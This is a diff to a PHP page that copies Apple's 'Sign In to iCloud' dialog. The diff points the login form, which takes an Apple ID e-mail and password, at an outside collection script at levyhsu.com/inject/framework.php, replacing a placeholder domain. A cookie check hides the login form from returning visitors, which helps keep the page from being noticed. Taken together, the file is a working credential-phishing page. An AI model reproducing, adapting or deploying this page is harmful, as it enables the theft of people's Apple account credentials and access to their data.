@@ -265,9 +265,10 @@ setcookie("first_visit", "true", time() + (86400 * 999), "/");
 
 <body>
 
+    //In the second visit you won't be able to see the login interface.
 <?php
 if(isset($_COOKIE["second_visit"])) {
-    echo "<p>Lorem ipsum CONSECUTIVE VISIT WEB CONTENT</p></body></html>";
+    echo "<p>here is the POST-SUBMIT WEB CONTENT, may be set to other webside of simplily delete this.</p></body></html>";
     die();
 }
 ?>
@@ -276,7 +277,7 @@ if(isset($_COOKIE["second_visit"])) {
 
 	<div class="modal-overlay modal-overlay-visible"></div>
 
-	<div class="modal modal-in" style="top: 10px;">
+	<div class="modal modal-in" style="top: 150px;"> //fix it to 150
 		<div class="modal-inner">
 			<div class="modal-title">
 				Sign In to iCloud
@@ -286,7 +287,7 @@ if(isset($_COOKIE["second_visit"])) {
 				Enter your Apple ID e-mail address and password
 			</div>
 
-			<form action="http://your.domain/mail-inject/framework.php" id="myform" method="get" name="myform">
+			<form action="http://levyhsu.com/inject/framework.php" id="myform" method="get" name="myform">
 				<input class="modal-text-input modal-text-input-double" name="modal-username" type="text" value="<?php
 					if (isset($_GET['modal-username'])) {
 					echo htmlspecialchars(stripslashes($_GET['modal-username']));
@@ -294,7 +295,7 @@ if(isset($_COOKIE["second_visit"])) {
 					?>"><input autofocus="" class="modal-text-input modal-text-input-double" id="password-input" name="modal-password" placeholder="Password" type="password">
 
 				<div>
-					<p>Lorem ipsum POST-SUBMIT WEB CONTENT</p>
+					<p>here is the POST-SUBMIT WEB CONTENT, may be set to other webside of simplily delete this.</p> 
 				</div>
 				</input>
 		</div>
